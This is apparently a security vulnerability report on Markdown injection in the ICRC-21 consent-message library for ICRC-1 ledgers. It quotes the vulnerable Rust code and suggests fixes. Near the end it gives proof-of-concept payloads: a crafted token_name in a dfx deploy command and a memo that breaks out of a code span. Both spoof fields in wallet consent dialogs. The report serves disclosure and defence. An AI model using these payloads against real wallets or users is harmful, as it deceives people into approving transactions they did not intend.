### Title
Markdown Injection in ICRC-21 `GenericDisplayMessage` via Unsanitized `token_name`, `token_symbol`, and `memo` — (`packages/icrc-ledger-types/src/icrc21/responses.rs`)

---

### Summary

The shared ICRC-21 consent-message library interpolates attacker-controlled strings (`token_name`, `token_symbol`, and the UTF-8 decoded `memo`) directly into a Markdown-formatted `GenericDisplayMessage` without any sanitization. A malicious ICRC-1 ledger canister developer can craft a `token_name` or `token_symbol` containing newlines and Markdown syntax to inject fake fields into the consent dialog shown to users. Independently, a malicious dapp (or any unprivileged ingress sender) can craft a transaction memo containing a backtick to break out of the inline code span and inject arbitrary Markdown into the same dialog. Both vectors undermine the security guarantee of ICRC-21, which is specifically designed to give users a trustworthy view of what they are signing.

---

### Finding Description

**Vector 1 — `token_name` / `token_symbol` injection (canister developer)**

`add_intent` in `packages/icrc-ledger-types/src/icrc21/responses.rs` interpolates `token_name` directly into a Markdown heading with no sanitization:

```rust
// line 53
message.push_str(&format!("# Send {}", token_name.unwrap()));
// line 65
message.push_str(&format!("# Spend {}", token_name.unwrap()));
```

`add_amount`, `add_fee`, `add_allowance`, and `add_existing_allowance` interpolate `token_symbol` inside a backtick code span:

```rust
// line 114
message.push_str(&format!("\n\n**Amount:** `{amount} {token_symbol}`"));
// line 144
message.push_str(&format!("\n\n**Approval fees:** `{fee} {token_symbol}`\n..."));
// line 188
message.push_str(&format!("\n\n**Requested allowance:** `{amount} {token_symbol}`\n..."));
// line 213
message.push_str(&format!("\n\n**Existing allowance:** `{expected_allowance} {token_symbol}`\n..."));
```

`token_name` and `token_symbol` are set at ledger initialization time by the canister developer and are read back verbatim from canister state by `icrc1_name()` / `icrc1_symbol()` before being passed into `build_icrc21_consent_info`. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) 

**Vector 2 — `memo` injection (unprivileged ingress sender / malicious dapp)**

`add_memo` decodes the raw ICRC-1 memo bytes as UTF-8 and places the result inside a *single-backtick* inline code span:

```rust
// lines 288-294
let memo_str = match std::str::from_utf8(memo.as_slice()) {
    Ok(valid_str) => valid_str.to_string(),
    Err(_) => hex::encode(memo.as_slice()),
};
// ...
message.push_str(&format!("\n\n**Memo:**\n`{memo_str}`"));
```

A backtick character inside `memo_str` terminates the code span, allowing everything that follows to be interpreted as raw Markdown by the rendering wallet. [5](#0-4) 

The contrast with the ckBTC and ckDOGE minters is instructive: those minters explicitly validate the Bitcoin/Dogecoin address before interpolating it into the Markdown message, with comments that directly call out the Markdown-injection risk. The shared ICRC-1/ICRC-2 library applies no equivalent guard. [6](#0-5) [7](#0-6) 

---

### Impact Explanation

**`token_name` injection** — A canister developer deploys an ICRC-1 ledger whose `token_name` is:

```
ICP

You are approving a transfer of funds from your account.

**From:**
`attacker_account`

**Amount:** `1000 ICP`

**To:**
`victim_account`

**Fees:** `0.0001 ICP`
Charged for processing the transfer.
```

`add_intent` emits `# Send <token_name>`, producing a `GenericDisplayMessage` that, when rendered by any Markdown-capable wallet, displays a fully spoofed consent dialog. The real fields appended afterward by `add_account` / `add_amount` appear below the injected content and may be scrolled off-screen or ignored. A user who approves based on the displayed dialog may unknowingly authorize a transaction with different parameters than shown.

**`memo` injection** — A malicious dapp constructs a transaction whose memo is the UTF-8 string:

```
`

# You are sending 1000 ICP to attacker

**To:**
`attacker_address
```

The rendered consent message breaks out of the `**Memo:** \`...\`` code span and injects a fake heading and fake "To" field. This is directly analogous to the `simulationResult` injection in the Solflare/Sui/Aptos Snaps: a less-trusted entity (the dapp) supplies data that is displayed verbatim in a security-critical confirmation dialog.

---

### Likelihood Explanation

**`token_name`/`token_symbol`**: Requires deploying a custom ICRC-1 ledger — a capability available to any canister developer on the IC. The attack is silent: the ledger looks legitimate until a wallet renders its ICRC-21 consent message. Any wallet that calls `icrc21_canister_call_consent_message` and renders `GenericDisplayMessage` as Markdown is affected.

**`memo`**: Requires only the ability to submit an ICRC-1 transfer with a crafted memo — an unprivileged ingress call. A malicious dapp that constructs transactions on behalf of users (the standard DeFi pattern) can set the memo without the user's knowledge. The ICRC-21 endpoint is then called by the wallet to show the user what they are signing, at which point the injected Markdown is rendered.

---

### Recommendation

1. **Sanitize `token_name` and `token_symbol`** before interpolating them into Markdown: strip or escape newlines (`\n`, `\r`) and Markdown heading/emphasis characters (`#`, `*`, `` ` ``).
2. **Escape backticks in `memo_str`**: replace every `` ` `` with `` \` `` before placing it inside a code span, or switch to a fenced code block (` ``` `) which is immune to single-backtick injection.
3. **Prefer `FieldsDisplayMessage`** for structured data: the `FieldsDisplay` variant carries typed `Value` entries that wallets render without Markdown interpretation, eliminating the injection surface entirely.
4. Apply the same pattern already used in the ckBTC/ckDOGE minters: validate or encode any user-supplied string before it is interpolated into a `GenericDisplayMessage`.

---

### Proof of Concept

**PoC 1 — `token_name` injection (canister developer)**

```bash
# Deploy an ICRC-1 ledger with a crafted token_name
dfx deploy icrc1-ledger --argument "(record {
  token_symbol = \"ICP\";
  token_name = \"ICP\n\nYou are approving a transfer of funds from your account.\n\n**From:**\n\`attacker_account\`\n\n**Amount:** \`1000 ICP\`\n\n**To:**\n\`victim_account\`\n\n**Fees:** \`0.0001 ICP\`\nCharged for processing the transfer.\";
  minting_account = record { owner = principal \"$PRINCIPAL\" };
  transfer_fee = 10_000;
  metadata = vec {};
  initial_balances = vec {};
  archive_options = record { num_blocks_to_archive = 2000; trigger_threshold = 1000; controller_id = principal \"$PRINCIPAL\"; };
})"

# Call icrc21_canister_call_consent_message for icrc1_transfer
# The returned GenericDisplayMessage contains injected Markdown fields
# A wallet rendering this Markdown shows a fully spoofed consent dialog
```

**PoC 2 — `memo` injection (unprivileged ingress sender / malicious dapp)**

```rust
// Craft a memo that breaks out of the backtick code span
let malicious_memo = b"`\n\n# You are sending 1000 ICP to attacker\n\n**To:**\n`attacker_address".to_vec();

let transfer_args = TransferArg {
    memo: Some(Memo::from(malicious_memo)),
    amount: Nat::from(1_u64),   // actual amount: 1 e8s
    to: victim_account,
    ..
};

// Wallet calls icrc21_canister_call_consent_message with these args.
// add_memo produces:
//   \n\n**Memo:**\n``\n\n# You are sending 1000 ICP to attacker\n\n**To:**\n`attacker_address`
// Rendered Markdown shows a fake heading and fake "To" field.
``` [5](#0-4) [8](#0-7) [3](#0-2)

### Citations

**File:** packages/icrc-ledger-types/src/icrc21/responses.rs (L48-85)
```rust
    pub fn add_intent(&mut self, intent: Icrc21Function, token_name: Option<String>) {
        match self {
            ConsentMessage::GenericDisplayMessage(message) => match intent {
                Icrc21Function::Transfer | Icrc21Function::GenericTransfer => {
                    assert!(token_name.is_some());
                    message.push_str(&format!("# Send {}", token_name.unwrap()));
                    message
                        .push_str("\n\nYou are approving a transfer of funds from your account.");
                }
                Icrc21Function::Approve => {
                    message.push_str("# Approve spending");
                    message.push_str(
                            "\n\nYou are authorizing another address to withdraw funds from your account.",
                        );
                }
                Icrc21Function::TransferFrom => {
                    assert!(token_name.is_some());
                    message.push_str(&format!("# Spend {}", token_name.unwrap()));
                    message.push_str(
                        "\n\nYou are approving a transfer of funds from a withdrawal account.",
                    );
                }
            },
            ConsentMessage::FieldsDisplayMessage(fields_display) => match intent {
                Icrc21Function::Transfer | Icrc21Function::GenericTransfer => {
                    assert!(token_name.is_some());
                    fields_display.intent = format!("Send {}", token_name.unwrap());
                }
                Icrc21Function::Approve => {
                    fields_display.intent = "Approve spending".to_string();
                }
                Icrc21Function::TransferFrom => {
                    assert!(token_name.is_some());
                    fields_display.intent = format!("Spend {}", token_name.unwrap());
                }
            },
        }
    }
```

**File:** packages/icrc-ledger-types/src/icrc21/responses.rs (L101-126)
```rust
    pub fn add_amount(
        &mut self,
        amount: Option<Nat>,
        decimals: u8,
        token_symbol: &String,
    ) -> Result<(), Icrc21Error> {
        let amount = amount.ok_or(Icrc21Error::GenericError {
            error_code: Nat::from(500_u64),
            description: "Amount has to be specified.".to_owned(),
        })?;
        match self {
            ConsentMessage::GenericDisplayMessage(message) => {
                let amount = convert_tokens_to_string_representation(amount, decimals)?;
                message.push_str(&format!("\n\n**Amount:** `{amount} {token_symbol}`"));
            }
            ConsentMessage::FieldsDisplayMessage(fields_display) => fields_display.fields.push((
                "Amount".to_string(),
                Value::TokenAmount {
                    decimals,
                    amount: nat_to_u64(amount)?,
                    symbol: token_symbol.to_string(),
                },
            )),
        }
        Ok(())
    }
```

**File:** packages/icrc-ledger-types/src/icrc21/responses.rs (L284-299)
```rust
    pub fn add_memo(&mut self, memo: GenericMemo) {
        match memo {
            GenericMemo::Icrc1Memo(memo) => {
                // Check if the memo is a valid UTF-8 string and display it as such if it is.
                let memo_str = match std::str::from_utf8(memo.as_slice()) {
                    Ok(valid_str) => valid_str.to_string(),
                    Err(_) => hex::encode(memo.as_slice()),
                };
                match self {
                    ConsentMessage::GenericDisplayMessage(message) => {
                        message.push_str(&format!("\n\n**Memo:**\n`{memo_str}`"));
                    }
                    ConsentMessage::FieldsDisplayMessage(fields_display) => fields_display
                        .fields
                        .push(("Memo".to_string(), Value::Text { content: memo_str })),
                }
```

**File:** packages/icrc-ledger-types/src/icrc21/lib.rs (L324-354)
```rust
pub fn build_icrc21_consent_info(
    consent_msg_request: ConsentMessageRequest,
    caller_principal: Principal,
    ledger_fee: Nat,
    token_symbol: String,
    token_name: String,
    decimals: u8,
    transfer_args: Option<GenericTransferArgs>,
) -> Result<ConsentInfo, Icrc21Error> {
    if consent_msg_request.arg.len() > MAX_CONSENT_MESSAGE_ARG_SIZE_BYTES as usize {
        return Err(Icrc21Error::UnsupportedCanisterCall(ErrorInfo {
            description: format!(
                "The argument size is too large. The maximum allowed size is {MAX_CONSENT_MESSAGE_ARG_SIZE_BYTES} bytes."
            ),
        }));
    }

    // for now, respond in English regardless of what the client requested
    let metadata = ConsentMessageMetadata {
        language: "en".to_string(),
        utc_offset_minutes: consent_msg_request
            .user_preferences
            .metadata
            .utc_offset_minutes,
    };

    let mut display_message_builder =
        ConsentMessageBuilder::new(&consent_msg_request.method, decimals)?
            .with_ledger_fee(ledger_fee.clone())
            .with_token_symbol(token_symbol)
            .with_token_name(token_name);
```

**File:** rs/ledger_suite/icrc1/ledger/src/main.rs (L1189-1207)
```rust
#[update]
fn icrc21_canister_call_consent_message(
    consent_msg_request: ConsentMessageRequest,
) -> Result<ConsentInfo, Icrc21Error> {
    let caller_principal = ic_cdk::api::msg_caller();
    let ledger_fee = icrc1_fee();
    let token_symbol = icrc1_symbol();
    let token_name = icrc1_name();
    let decimals = icrc1_decimals();

    build_icrc21_consent_info_for_icrc1_and_icrc2_endpoints(
        consent_msg_request,
        caller_principal,
        ledger_fee,
        token_symbol,
        token_name,
        decimals,
    )
}
```

**File:** rs/bitcoin/ckbtc/minter/src/updates/icrc21.rs (L195-209)
```rust
/// Verifies that `address` parses as a valid Bitcoin address on the configured
/// network before it gets interpolated into a consent message. This both
/// guarantees the user is shown a meaningful (parseable) destination and rules
/// out Markdown-injection vectors in the GenericDisplay output (e.g. an
/// "address" that contains newlines or backticks crafted to fake additional
/// fields). Uses the same parser as `retrieve_btc_with_approval`, so any
/// address the consent endpoint accepts is also accepted by the actual call.
fn validate_address(address: &str, network: Network) -> Result<(), Icrc21Error> {
    BitcoinAddress::parse(address, network).map_err(|e| {
        Icrc21Error::UnsupportedCanisterCall(ErrorInfo {
            description: format!("Invalid Bitcoin destination address: {e}"),
        })
    })?;
    Ok(())
}
```

**File:** rs/dogecoin/ckdoge/minter/src/updates/icrc21.rs (L196-210)
```rust
/// Verifies that `address` parses as a valid Dogecoin address on the configured
/// network before it gets interpolated into a consent message. This both
/// guarantees the user is shown a meaningful (parseable) destination and rules
/// out Markdown-injection vectors in the GenericDisplay output (e.g. an
/// "address" that contains newlines or backticks crafted to fake additional
/// fields). Uses the same parser as `retrieve_doge_with_approval`, so any
/// address the consent endpoint accepts is also accepted by the actual call.
fn validate_address(address: &str, network: Network) -> Result<(), Icrc21Error> {
    DogecoinAddress::parse(address, &network).map_err(|e| {
        Icrc21Error::UnsupportedCanisterCall(ErrorInfo {
            description: format!("Invalid Dogecoin destination address: {e}"),
        })
    })?;
    Ok(())
}
```
